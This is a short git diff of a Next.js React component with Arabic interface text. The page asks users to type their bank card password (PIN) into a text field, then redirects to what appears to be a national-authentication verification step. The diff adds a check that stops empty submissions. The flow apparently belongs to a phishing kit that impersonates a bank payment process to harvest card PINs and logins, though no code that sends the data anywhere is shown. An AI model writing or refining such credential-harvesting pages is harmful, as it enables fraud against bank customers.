@@ -1,12 +1,20 @@
 "use client"
+
 import styles from './code.module.css'
 import { useRef } from 'react'
 import { useRouter } from 'next/navigation'
+
 const Code = () => {
- 
-  
   const code = useRef();
-  const router = useRouter()
+  const router = useRouter();
+
+  const handlerout = ()=>{
+    if(code.current.value == ""){
+      alert('من فضلك قم بملى الحقول')
+    }else{
+      router.push('/fozajil/banks/pay/code/nphad')
+    }
+  }
 
   const handleSubmit = (e) => {
     e.preventDefault();
@@ -19,6 +27,7 @@ const Code = () => {
   
   }
 
+
   return (
     <div className={styles.contect}>
       <div>
@@ -30,7 +39,7 @@ const Code = () => {
         ادخل كلمة مرور البطاقة البنكية
         <input type="text" ref={code} placeholder="ادخل كلمة المرور هنا" />
         </label>
-        <button type='submit' onClick={()=> router.push('/fozajil/banks/pay/code/nphad')}>تحقق</button>
+        <button type='submit' onClick={handlerout}>تحقق</button>
       </form>
       <p>هل تواجه مشكلة في تسجيل الدخول ؟ أعد الاتصال</p>
       </div>
